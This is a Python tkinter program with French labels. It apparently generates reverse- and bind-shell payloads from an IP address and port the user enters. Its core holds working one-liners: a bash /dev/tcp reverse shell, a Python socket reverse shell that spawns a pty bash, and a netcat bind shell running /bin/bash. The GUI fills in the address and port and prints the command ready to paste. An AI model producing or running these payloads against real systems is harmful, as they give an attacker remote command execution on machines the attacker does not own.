import tkinter as tk
from tkinter import ttk, messagebox

# Fonction qui génère le payload selon les entrées
def generate_payload():
    ip = ip_entry.get()
    port = port_entry.get()
    payload_type = payload_var.get()

    if not ip or not port:
        messagebox.showerror("Erreur", "IP et port sont requis")
        return

    try:
        port_num = int(port)
        if not (1 <= port_num <= 65535):
            raise ValueError
    except ValueError:
        messagebox.showerror("Erreur", "Port invalide")
        return

    # Exemple de payloads (à adapter selon ton projet)
    if payload_type == "Reverse Shell (bash)":
        payload = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    elif payload_type == "Reverse Shell (python)":
        payload = (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{ip}\",{port}));"
            f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
            f"import pty; pty.spawn(\"/bin/bash\")'"
        )
    elif payload_type == "Bind Shell (nc)":
        payload = f"nc -lvp {port} -e /bin/bash"
    else:
        payload = "Payload inconnu"

    # Affiche le payload
    output_text.delete("1.0", tk.END)
    output_text.insert(tk.END, payload)


# Création de la fenêtre principale
root = tk.Tk()
root.title("Générateur de Payload")

# Widgets
tk.Label(root, text="Adresse IP:").grid(row=0, column=0, sticky="e", padx=5, pady=5)
ip_entry = tk.Entry(root)
ip_entry.grid(row=0, column=1, padx=5, pady=5)

tk.Label(root, text="Port:").grid(row=1, column=0, sticky="e", padx=5, pady=5)
port_entry = tk.Entry(root)
port_entry.grid(row=1, column=1, padx=5, pady=5)

tk.Label(root, text="Type de payload:").grid(row=2, column=0, sticky="e", padx=5, pady=5)
payload_var = tk.StringVar()
payload_combobox = ttk.Combobox(root, textvariable=payload_var)
payload_combobox['values'] = ("Reverse Shell (bash)", "Reverse Shell (python)", "Bind Shell (nc)")
payload_combobox.current(0)
payload_combobox.grid(row=2, column=1, padx=5, pady=5)

generate_button = tk.Button(root, text="Générer", command=generate_payload)
generate_button.grid(row=3, column=0, columnspan=2, pady=10)

output_text = tk.Text(root, height=5, width=60)
output_text.grid(row=4, column=0, columnspan=2, padx=5, pady=5)

# Lance la boucle principale
root.mainloop()
